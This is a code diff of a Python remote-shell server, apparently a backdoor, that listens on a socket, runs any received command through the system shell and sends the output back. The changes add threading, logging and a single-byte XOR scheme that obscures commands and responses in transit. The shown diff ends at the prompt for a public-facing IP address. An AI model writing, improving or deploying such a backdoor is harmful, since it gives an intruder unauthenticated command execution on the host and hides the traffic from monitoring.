@@ -1,28 +1,43 @@
 import socket
 import subprocess
+import threading
+import logging
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def xor_encrypt_decrypt(data, key):
+    return ''.join(chr(ord(c) ^ key) for c in data)
 
 def start_server(ip, port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((ip, port))
     server.listen(5)
-    print(f"Listening on {ip}:{port}")
+    logging.info(f"Listening on {ip}:{port}")
 
     while True:
-        client, addr = server.accept()
-        print(f"Connection from {addr}")
-        handle_client(client)
+        try:
+            client, addr = server.accept()
+            logging.info(f"Connection from {addr}")
+            client_handler = threading.Thread(target=handle_client, args=(client,))
+            client_handler.start()
+        except Exception as e:
+            logging.error(f"Error accepting connection: {e}")
 
 def handle_client(client_socket):
     with client_socket:
         while True:
-            request = client_socket.recv(1024)
-            if not request:
+            try:
+                request = client_socket.recv(1024)
+                if not request:
+                    break
+                command = xor_encrypt_decrypt(request.decode(), 16)
+                logging.info(f"Received: {command}")
+                output = subprocess.run(command, shell=True, capture_output=True, text=True)
+                response = xor_encrypt_decrypt(output.stdout + output.stderr, 16)
+                client_socket.send(response.encode())
+            except Exception as e:
+                logging.error(f"Error handling client: {e}")
                 break
-            command = request.decode()
-            print(f"Received: {command}")
-            output = subprocess.run(command, shell=True, capture_output=True, text=True)
-            response = output.stdout + output.stderr
-            client_socket.send(response.encode())
 
 if __name__ == "__main__":
     ip = input("Enter public facing IP address (or leave blank for default): ")
